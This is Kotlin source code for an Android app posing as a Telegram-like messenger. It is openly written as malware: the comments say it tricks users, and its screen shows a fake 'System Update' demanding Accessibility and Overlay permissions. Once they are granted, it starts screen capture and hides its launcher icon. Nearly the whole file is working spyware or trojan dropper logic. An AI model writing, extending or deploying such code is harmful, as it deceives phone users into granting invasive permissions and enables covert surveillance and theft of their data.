package com.telegram2.messaging

import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.unit.dp
import androidx.activity.result.contract.ActivityResultContracts

class MainActivity : ComponentActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Request overlay permission automatically
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName"))
            startActivity(intent)
        }

        // Request accessibility permission
        // We guide user to settings
        val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        // We show Compose UI to trick user
        setContent {
            MaterialTheme {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    FakeUpdateScreen(
                        onEnableAccessibility = {
                            // After "Enable" button, we launch accessibility settings
                            startActivity(accessibilityIntent)
                        },
                        onProceed = {
                            // After permissions granted, start screen capture
                            startScreenCapture()
                            // Hide icon
                            val pkg = applicationContext.packageName
                            packageManager.setComponentEnabledSetting(
                                componentName,
                                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                android.content.pm.PackageManager.DONT_KILL_APP
                            )
                            finish()
                        }
                    )
                }
            }
        }
    }

    private fun startScreenCapture() {
        val intent = Intent(this, ScreenPermissionActivity::class.java)
        startActivity(intent)
    }
}

@Composable
fun FakeUpdateScreen(onEnableAccessibility: () -> Unit, onProceed: () -> Unit) {
    Column(
        modifier = Modifier.fillMaxSize().padding(32.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("System Update", style = MaterialTheme.typography.headlineLarge)
        Spacer(modifier = Modifier.height(24.dp))
        Text("To complete the security update, you must enable Accessibility and Overlay permissions.",
            style = MaterialTheme.typography.bodyLarge)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onEnableAccessibility) {
            Text("Enable Accessibility")
        }
        Spacer(modifier = Modifier.height(8.dp))
        Text("Then click Continue", style = MaterialTheme.typography.bodyMedium)
        Spacer(modifier = Modifier.height(16.dp))
        Button(onClick = onProceed) {
            Text("Continue")
        }
    }
}